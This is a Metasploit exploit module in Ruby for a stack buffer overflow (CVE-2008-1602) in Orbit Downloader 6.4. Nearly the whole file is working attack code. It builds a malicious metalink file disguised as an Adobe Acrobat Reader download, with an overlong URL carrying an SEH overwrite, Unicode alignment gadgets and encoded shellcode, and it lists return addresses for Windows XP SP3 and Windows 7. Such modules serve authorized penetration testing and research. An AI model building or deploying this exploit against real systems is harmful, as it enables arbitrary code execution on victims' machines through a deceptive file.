##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Orbit Downloader URL Unicode Conversion Overflow',
      'Description'    => %q{
          This module exploits a stack-based buffer overflow in Orbit Downloader.
        The vulnerability is due to Orbit converting an URL ascii string to unicode
        in a insecure way with MultiByteToWideChar.
        The vulnerability is exploited with a specially crafted metalink file that
        should be opened with Orbit through the "File->Add Metalink..." option.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Diego Juarez', # Vulnerability discovery
          'juan vazquez', # Metasploit module
        ],
      'Version'        => '$ $',
      'References'     =>
        [
          [ 'BID', '28541' ],
          [ 'OSVDB', '44036' ],
          [ 'CVE', '2008-1602' ],
          [ 'URL', 'http://www.coresecurity.com/content/orbit-downloader' ],
        ],
      'Payload'        =>
        {
          'Space'       => 2000,
          'EncoderType'  => Msf::Encoder::Type::AlphanumUnicodeMixed,
          'EncoderOptions' => { 'BufferRegister' => 'EAX' },
          'BadChars'    => "\x00\x09\x0a\x0b\x0c\x0d\x26\x3c",
          'DisableNops' => true,
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'Orbit Downloader 6.4 on Windows XP SP3',
            {
              'Ret' => 0x4b38, # p/p/r unicode compatible from orbitdm.exe
              'Nop' => 0x46, # 004600 => add [esi+0x0],al
              'AddEax' => "\x05\x15\x11", # add eax,0x11001500
              'Offset' => 4
            }
          ],
          [ 'Orbit Downloader 6.4 on Windows 7',
            {
              'Ret' => 0x4b38, # p/p/r unicode compatible from orbitdm.exe
              'Nop' => 0x46, # 004600 => add [esi+0x0],al
              'AddEax' => "\x05\x16\x11", # add eax,0x11001600
              'Offset' => 120
            }
          ]
        ],
      'Privileged'     => false,
      'DisclosureDate' => 'Apr 03 2008',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('FILENAME', [ true, 'The file name.',  'msf.metalink']),
      ], self.class)
  end

  def exploit

    sploit = rand_text_alpha(4096 - "http://".length)
    sploit << "\xff" * 2 # EIP =>  Access Violation
    sploit << rand_text_alpha(120) # padding
    sploit << "\x61\x62" # NSEH # popad (61) + nop compatible with unicode (add [edx+0x0],ah # 006200)
    sploit << [target.ret].pack("v") # seh # ppr
    sploit << target['Nop']
    sploit << target['AddEax'] # eax align is os dependant
    sploit << target['Nop']
    sploit << "\x2d\x11\x11" # sub eax,0x11001100
    sploit << target['Nop']
    sploit << "\x50" # push eax
    sploit << target['Nop']
    sploit << "\xc3" # ret
    sploit << rand_text_alpha(target['Offset']) # align shellcode to eax pointer
    sploit << payload.encoded

    metalink = %Q|
<?xml version="1.0" encoding="utf-8"?>
<metalink version="3.0" generator="Metalink Generator v1.00.0034" xmlns="http://www.metalinker.org/">
  <publisher>
    <name>Adobe</name>
    <url>http://www.adobe.com/</url>
  </publisher>
  <description>Adobe Acrobat Reader</description>
  <files>
    <file name="AdbeRdr80_en_US.exe">
      <version>8.0</version>
      <language>en-US</language>
      <os>Windows-x86</os>
      <verification>
        <hash type="md5">0ab5ce309f313ed028824251c798b35c</hash>
      </verification>
      <resources>
        <url type="http" preference="100">http://#{sploit}.com/pub/adobe/reader/win/8.x/8.0/enu/AdbeRdr80_en_US.exe</url>
      </resources>
    </file>
  </files>
</metalink>
|

    print_status("Creating '#{datastore['FILENAME']}' file ...")

    file_create(metalink)

  end

end
